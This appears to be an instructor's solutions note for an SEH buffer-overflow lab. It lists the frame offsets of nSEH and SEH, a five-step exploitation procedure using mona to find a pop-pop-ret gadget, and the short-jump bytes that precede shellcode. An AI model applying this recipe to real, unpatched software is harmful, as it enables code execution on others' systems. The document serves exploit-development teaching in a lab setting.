# Solutions notes (SEH lab)

## Expected layout (this source)

Packed frame:

```text
offset 0     start of overflow string (= start of frame.buf)
offset 512   nSEH  (frame.seh.next)
offset 516   SEH   (frame.seh.handler)
```

If your build inserts padding, mona/`!exchain` wins over this table.

## Procedure

1. Pattern → offsets for nSEH/SEH  
2. Markers `BBBB`/`CCCC` via `04_nseh_seh_control.py`  
3. `!mona seh -cpb "\\x00\\x0a"` → `PPR`  
4. `nSEH = \\xeb\\x06\\x90\\x90` + `PPR` + shellcode  
5. INT3 first, then real payload  

## Gadget (MinGW example only)

`gadget_pop_pop_ret` disassembles to `58 58 c3`. Address varies by build — use mona.
